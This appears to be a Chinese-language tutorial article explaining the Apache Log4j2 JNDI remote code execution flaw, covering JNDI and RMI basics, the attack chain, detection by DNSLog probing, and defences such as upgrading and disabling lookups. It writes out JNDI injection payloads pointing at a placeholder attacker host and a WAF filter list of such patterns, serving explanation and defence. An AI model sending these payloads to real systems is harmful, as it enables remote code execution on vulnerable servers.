<h1 class="header-vfC6AV auto-hide-last-sibling-br">Apache Log4j2 远程代码执行漏洞全解析</h1>
<h2 class="header-vfC6AV auto-hide-last-sibling-br">一、漏洞概述</h2>
<h3 class="header-vfC6AV auto-hide-last-sibling-br">1. 漏洞原理</h3>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space">Apache Log4j2 是 Java 生态中广泛使用的日志框架，其<code>Lookup</code>功能存在致命缺陷：<strong>未限制 JNDI（Java 命名和目录接口）查询</strong>。攻击者可在日志消息中插入恶意 JNDI 表达式（如<code>${jndi:rmi://恶意服务器/恶意类}</code>），触发 Log4j2 加载远程恶意<code>.class</code>文件，最终实现远程代码执行。</div>
<h3 class="header-vfC6AV auto-hide-last-sibling-br">2. 影响范围</h3>
<ul class="auto-hide-last-sibling-br">
 	<li>覆盖超 6 万个开源软件及 32 万个相关版本包，几乎席卷整个 Java 生态（如电商平台、分布式系统、中间件等）；</li>
 	<li>利用成本极低，仅需构造含恶意 Payload 的输入（如 URL 参数、表单数据）即可触发，危害极大。</li>
</ul>
<h2 class="header-vfC6AV auto-hide-last-sibling-br">二、Java 日志体系与核心概念</h2>
<h3 class="header-vfC6AV auto-hide-last-sibling-br">1. 日志框架发展历程</h3>
<ul class="auto-hide-last-sibling-br">
 	<li><strong>JCL（Jakarta Commons Logging）</strong>：提供抽象层，动态绑定日志实现（如 log4j、JUL）；</li>
 	<li><strong>Slf4j（2006 年）</strong>：需桥接包绑定实现，配套 Logback 作为默认实现；</li>
 	<li><strong>Log4j2（2014 年）</strong>：Apache 推出，不兼容旧版 log4j，借鉴 Slf4j+Logback 设计，成为主流日志工具（也是本次漏洞主角）。</li>
</ul>
<h3 class="header-vfC6AV auto-hide-last-sibling-br">2. JNDI 基础</h3>
<ul class="auto-hide-last-sibling-br">
 	<li><strong>定义</strong>：JNDI（Java Naming and Directory Interface）是一组接口，用于查找远程或本地对象，提供命名服务（对象与名称绑定）和目录服务（管理对象属性）。</li>
 	<li><strong>支持服务</strong>：可访问 JDBC、LDAP、RMI、DNS 等，漏洞利用中主要涉及<strong>RMI</strong>（远程方法调用）和<strong>LDAP</strong>（轻型目录访问协议）。</li>
</ul>
<h3 class="header-vfC6AV auto-hide-last-sibling-br">3. RMI 基础</h3>
<ul class="auto-hide-last-sibling-br">
 	<li><strong>定义</strong>：RMI（远程方法调用）允许不同 Java 虚拟机之间远程调用方法，通过序列化传输对象。</li>
 	<li><strong>核心组件</strong>：
<ul class="auto-hide-last-sibling-br">
 	<li>Client（客户端）：请求远程方法；</li>
 	<li>Registry（注册中心）：存储远程对象的注册和查找服务（默认端口 1099）；</li>
 	<li>Server（服务端）：提供远程方法，在 Registry 中注册对象。</li>
</ul>
</li>
 	<li><strong>URL 格式</strong>：<code>rmi://host:port/name</code>（host 为注册中心主机，name 为远程对象标识符）。</li>
</ul>
<h2 class="header-vfC6AV auto-hide-last-sibling-br">三、JNDI 注入攻击原理</h2>
<h3 class="header-vfC6AV auto-hide-last-sibling-br">1. 核心机制</h3>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space">当 JNDI 的<code>lookup()</code>方法参数可控时，攻击者可传入恶意 URL，诱导目标加载远程恶意类。通过<code>Reference</code>类解决 “目标缺少恶意类” 的问题，使目标从指定地址下载并执行恶意代码。</div>
<h3 class="header-vfC6AV auto-hide-last-sibling-br">2. 攻击流程</h3>
<ol class="auto-hide-last-sibling-br">
 	<li>目标程序调用<code>lookup(String)</code>且参数可控，攻击者传入指向恶意 RMI/LDAP 服务器的 URL；</li>
 	<li>恶意服务器返回含<code>Reference</code>对象的 JNDI 引用（包含恶意类的加载地址）；</li>
 	<li>目标解析<code>Reference</code>，获取恶意类的 HTTP 地址；</li>
 	<li>目标远程加载恶意类的<code>.class</code>字节码并实例化，执行代码（如反弹 shell、文件操作）。</li>
</ol>

<h2 class="header-vfC6AV auto-hide-last-sibling-br">四、Log4j2 漏洞攻击链详解</h2>
<ol class="auto-hide-last-sibling-br">
 	<li><strong>输入注入</strong>：攻击者发送含恶意 JNDI 表达式的请求（如<code>${jndi:rmi://攻击者IP:1099/test}</code>），被目标 Java 应用接收并记录到日志；</li>
 	<li><strong>日志解析</strong>：Log4j2 检测到日志中的<code>${}</code>格式，触发<code>Lookup</code>机制解析内容；</li>
 	<li><strong>JNDI 调用</strong>：解析到<code>jndi:</code>协议后，调用<code>JndiLookup.lookup()</code>方法，进一步触发<code>InitialContext.lookup()</code>；</li>
 	<li><strong>远程加载</strong>：目标连接恶意 RMI/LDAP 服务器，获取恶意类引用；</li>
 	<li><strong>代码执行</strong>：目标加载并实例化恶意类，执行内置命令（如反弹 shell）。</li>
</ol>

<h2 class="header-vfC6AV auto-hide-last-sibling-br">七、漏洞识别方法</h2>
<ol class="auto-hide-last-sibling-br">
 	<li><strong>表达式测试</strong>：向目标输入<code>${java:os}</code>（如 URL 参数），若日志中输出操作系统信息，说明<code>Lookup</code>功能已触发；</li>
 	<li><strong>DNSLog 检测</strong>：发送<code>${jndi:ldap://xxxx.dnslog.cn}</code>，若 DNSLog 有解析记录，表明目标存在 JNDI 查询行为；</li>
 	<li><strong>版本核查</strong>：若目标使用 Log4j2 ≤2.14.1 版本，存在漏洞风险。</li>
</ol>
<h2 class="header-vfC6AV auto-hide-last-sibling-br">八、防御建议</h2>
<ol class="auto-hide-last-sibling-br">
 	<li><strong>版本升级</strong>：升级至 Log4j2 2.15.0+（2.15.0 禁用 JNDI 动态加载，2.16.0 移除 JNDI 功能）；</li>
 	<li><strong>临时配置</strong>：设置系统属性<code>log4j2.formatMsgNoLookups=true</code>，禁用<code>Lookup</code>功能；</li>
 	<li><strong>JDK 限制</strong>：使用 JDK 8u121+，设置<code>com.sun.jndi.rmi.object.trustURLCodebase=false</code>禁止远程类加载；</li>
 	<li><strong>输入过滤</strong>：通过 WAF 拦截含<code>${jndi:</code>、<code>rmi://</code>、<code>ldap://</code>等特征的请求；</li>
 	<li><strong>安全审计</strong>：监控日志中的异常 JNDI 调用，及时发现攻击。</li>
</ol>
